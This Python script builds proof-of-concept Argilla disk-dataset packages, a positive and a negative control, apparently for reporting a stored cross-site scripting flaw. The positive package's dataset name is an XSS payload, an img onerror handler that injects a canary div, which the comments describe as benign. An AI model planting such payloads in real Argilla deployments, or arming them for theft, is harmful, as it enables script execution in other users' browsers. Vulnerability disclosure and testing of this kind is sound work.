# Build the Argilla disk-dataset PoC packages (positive + negative control).
#
# Package layout (Argilla v2 native disk dataset, produced/consumed by
# Dataset.to_disk()/Dataset.from_disk()):
#   <package>/.argilla/dataset.json   <- dataset model; ONLY "name" differs between the two packages
#   <package>/.argilla/settings.json  <- identical in both packages
#
# No records.json, no scripts, no plugins: the dataset name is the only payload carrier.
# Both names are <= 200 chars (server-side DatasetName constraint in
# argilla-server/src/argilla_server/api/schemas/v1/datasets.py).

import hashlib
import json
import os
import uuid

POSITIVE_DIR = os.path.join("samples", "poc-positive")
NEGATIVE_DIR = os.path.join("samples", "poc-negative")

# Benign sentinel payload: only draws a canary <div> into the page, no network,
# no cookie access, no redirect. Marker id is greppable in the DOM after trigger.
PAYLOAD_NAME = (
    '<img src=x onerror="document.body.insertAdjacentHTML('
    "'beforeend','<div id=argilla-xss-canary>ARGILLA-XSS-CANARY-8f3a21</div>')\">"
)
NEGATIVE_NAME = "demo-safe-dataset-name"

# Byte-for-byte identical in both packages; structurally identical to what
# `Dataset.to_disk()` writes for a dataset with one text field and one
# label_selection question (captured from a live 2.8.0 export).
SETTINGS = {
    "guidelines": None,
    "questions": [
        {
            "id": None,
            "inserted_at": None,
            "updated_at": None,
            "name": "label",
            "settings": {
                "type": "label_selection",
                "options": [
                    {"value": "yes", "text": "yes", "description": None},
                    {"value": "no", "text": "no", "description": None},
                ],
                "visible_options": None,
            },
            "title": "label",
            "description": None,
            "required": True,
            "dataset_id": None,
            "type": "label_selection",
        }
    ],
    "fields": [
        {
            "id": None,
            "inserted_at": None,
            "updated_at": None,
            "name": "text",
            "settings": {"type": "text", "use_markdown": False},
            "title": "text",
            "required": True,
            "description": None,
            "dataset_id": None,
            "type": "text",
        }
    ],
    "vectors": [],
    "metadata": [],
    "allow_extra_metadata": False,
    "distribution": {"strategy": "overlap", "min_submitted": 1},
    "mapping": None,
}


def dataset_json(name: str, dataset_id: str) -> dict:
    return {
        "id": dataset_id,
        "inserted_at": None,
        "updated_at": None,
        "name": name,
        "status": "ready",
        "guidelines": None,
        "allow_extra_metadata": False,
        "distribution": {"strategy": "overlap", "min_submitted": 1},
        "workspace_id": None,
        "last_activity_at": None,
    }


def write_package(pkg_dir: str, name: str, dataset_id: str) -> str:
    argilla_dir = os.path.join(pkg_dir, ".argilla")
    os.makedirs(argilla_dir, exist_ok=True)
    dataset_path = os.path.join(argilla_dir, "dataset.json")
    settings_path = os.path.join(argilla_dir, "settings.json")
    with open(dataset_path, "w", encoding="utf-8", newline="\n") as f:
        json.dump(dataset_json(name, dataset_id), f, indent=2)
        f.write("\n")
    with open(settings_path, "w", encoding="utf-8", newline="\n") as f:
        json.dump(SETTINGS, f, indent=2)
        f.write("\n")
    return dataset_path


def sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def main() -> None:
    for d in (POSITIVE_DIR, NEGATIVE_DIR):
        os.makedirs(d, exist_ok=True)

    pos = write_package(POSITIVE_DIR, PAYLOAD_NAME, str(uuid.UUID("5f1a2b3c-0000-4000-8000-00000000e001")))
    neg = write_package(NEGATIVE_DIR, NEGATIVE_NAME, str(uuid.UUID("5f1a2b3c-0000-4000-8000-00000000e002")))

    print(f"[+] positive dataset name ({len(PAYLOAD_NAME)} chars): {PAYLOAD_NAME}")
    print(f"[+] negative dataset name ({len(NEGATIVE_NAME)} chars): {NEGATIVE_NAME}")

    # settings.json must be byte-identical across the two packages
    assert sha256(os.path.join(POSITIVE_DIR, ".argilla", "settings.json")) == sha256(
        os.path.join(NEGATIVE_DIR, ".argilla", "settings.json")
    ), "settings.json files differ"
    print("[+] settings.json identical in both packages")

    sums_path = "SHA256SUMS.txt"
    entries = [pos, neg, os.path.join(POSITIVE_DIR, ".argilla", "settings.json")]
    with open(sums_path, "w", encoding="utf-8", newline="\n") as f:
        for p in entries:
            f.write(f"{sha256(p)}  {p.replace(os.sep, '/')}\n")
    print(f"[+] wrote {sums_path}")
    for line in open(sums_path, encoding="utf-8"):
        print("   ", line.strip())


if __name__ == "__main__":
    main()
